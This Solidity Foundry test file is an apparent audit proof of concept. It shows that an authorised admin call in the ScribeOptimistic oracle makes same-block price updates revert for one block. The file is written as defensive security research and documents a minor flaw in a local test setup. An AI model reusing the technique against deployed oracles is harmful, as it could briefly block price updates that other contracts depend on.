// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {console2} from "forge-std/console2.sol";

import {IScribe} from "src/IScribe.sol";
import {IScribeOptimistic} from "src/IScribeOptimistic.sol";
import {ScribeOptimistic} from "src/ScribeOptimistic.sol";

import {LibSecp256k1} from "src/libs/LibSecp256k1.sol";
import {LibFeed} from "script/libs/LibFeed.sol";

import {IToll} from "chronicle-std/toll/IToll.sol";

import {Test} from "forge-std/Test.sol";

/// @title PoC: One-block DoS after auth action in ScribeOptimistic
/// @notice Demonstrates that _afterAuthedAction() sets _pokeData.age = block.timestamp,
///         making same-block poke/opPoke impossible (stale check).
contract POC_OneBlockDoS is Test {
    using LibSecp256k1 for LibSecp256k1.Point;
    using LibFeed for LibFeed.Feed;
    using LibFeed for LibFeed.Feed[];

    ScribeOptimistic private opScribe;
    LibFeed.Feed[] private feeds;

    function setUp() public {
        opScribe = new ScribeOptimistic(address(this), "ETH/USD");
        // Toll ourselves so poke/opPoke/setOpChallengePeriod don't revert
        IToll(address(opScribe)).kiss(address(this));
        feeds = _liftFeeds(opScribe.bar());
    }

    function test_one_block_dos_after_setOpChallengePeriod() public {
        // Step 1: Initial poke to set a value
        uint128 val1 = 1000;
        IScribe.PokeData memory pokeData1;
        pokeData1.val = val1;
        pokeData1.age = uint32(block.timestamp);
        IScribe.SchnorrData memory schnorr1 =
            feeds.signSchnorr(opScribe.constructPokeMessage(pokeData1));
        opScribe.poke(pokeData1, schnorr1);

        // Verify poke succeeded
        assertEq(opScribe.read(), val1);
        console2.log("Step 1: Initial poke succeeded, val =", val1);

        // Step 2: Auth action triggers _afterAuthedAction()
        // This sets _pokeData.age = uint32(block.timestamp)
        uint16 oldPeriod = opScribe.opChallengePeriod();
        opScribe.setOpChallengePeriod(oldPeriod + 1);
        console2.log("Step 2: setOpChallengePeriod called in same block");

        // Step 3: Try to poke in the SAME block — should REVERT (StaleMessage)
        IScribe.PokeData memory pokeData2;
        pokeData2.val = 2000;
        pokeData2.age = uint32(block.timestamp);
        IScribe.SchnorrData memory schnorr2 =
            feeds.signSchnorr(opScribe.constructPokeMessage(pokeData2));

        vm.expectRevert();
        opScribe.poke(pokeData2, schnorr2);
        console2.log("Step 3: Same-block poke REVERTS (as expected)");

        // Step 4: Try opPoke in the SAME block — should also REVERT
        IScribe.ECDSAData memory ecdsaData =
            feeds[0].signECDSA(opScribe.constructOpPokeMessage(pokeData2, schnorr2));
        vm.expectRevert();
        opScribe.opPoke(pokeData2, schnorr2, ecdsaData);
        console2.log("Step 4: Same-block opPoke also REVERTS (as expected)");

        // Step 5: Advance ONE block — poke should now SUCCEED
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1); // timestamp must advance for age > _pokeData.age
        pokeData2.age = uint32(block.timestamp);
        schnorr2 = feeds.signSchnorr(opScribe.constructPokeMessage(pokeData2));
        opScribe.poke(pokeData2, schnorr2);

        assertEq(opScribe.read(), 2000);
        console2.log("Step 5: Next-block poke SUCCEEDS, val =", opScribe.read());
        console2.log("PoC PASSED: One-block DoS confirmed");
    }

    function test_one_block_dos_after_setMaxChallengeReward() public {
        // Same pattern with a different auth action
        IScribe.PokeData memory pokeData;
        pokeData.val = 1000;
        pokeData.age = uint32(block.timestamp);
        IScribe.SchnorrData memory schnorr =
            feeds.signSchnorr(opScribe.constructPokeMessage(pokeData));
        opScribe.poke(pokeData, schnorr);

        // Auth action: setMaxChallengeReward
        opScribe.setMaxChallengeReward(1 ether);

        // Same-block poke fails
        pokeData.val = 2000;
        pokeData.age = uint32(block.timestamp);
        schnorr = feeds.signSchnorr(opScribe.constructPokeMessage(pokeData));
        vm.expectRevert();
        opScribe.poke(pokeData, schnorr);
        console2.log("PoC PASSED: DoS after setMaxChallengeReward also confirmed");
    }

    function _liftFeeds(uint8 numberFeeds)
        internal
        returns (LibFeed.Feed[] memory)
    {
        LibFeed.Feed[] memory feeds_ = new LibFeed.Feed[](uint(numberFeeds));
        uint privKey = 2;
        uint bloom;
        uint ctr;
        while (ctr != numberFeeds) {
            LibFeed.Feed memory feed = LibFeed.newFeed({privKey: privKey});
            if (bloom & (1 << feed.id) == 0) {
                bloom |= 1 << feed.id;
                feeds_[ctr++] = feed;
                opScribe.lift(
                    feed.pubKey,
                    feed.signECDSA(opScribe.feedRegistrationMessage())
                );
            }
            privKey++;
        }
        return feeds_;
    }
}
